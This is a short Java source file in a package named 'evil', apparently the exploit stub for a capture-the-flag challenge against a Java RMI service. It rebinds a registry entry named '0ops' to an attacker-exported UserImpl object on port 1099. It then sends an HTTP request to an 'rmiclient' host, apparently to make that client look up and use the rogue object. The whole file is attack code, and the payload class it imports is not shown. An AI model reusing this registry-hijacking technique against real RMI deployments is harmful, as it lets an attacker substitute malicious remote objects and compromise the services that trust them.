package evil;

import com.yxxx.UserImpl;

import java.net.URL;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class Main {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.getRegistry(1099);
        registry.rebind("0ops", UnicastRemoteObject.exportObject(new UserImpl(), 0));
        new URL("http://rmiclient:8080/hello?name=ccl").openStream().read();
    }
}
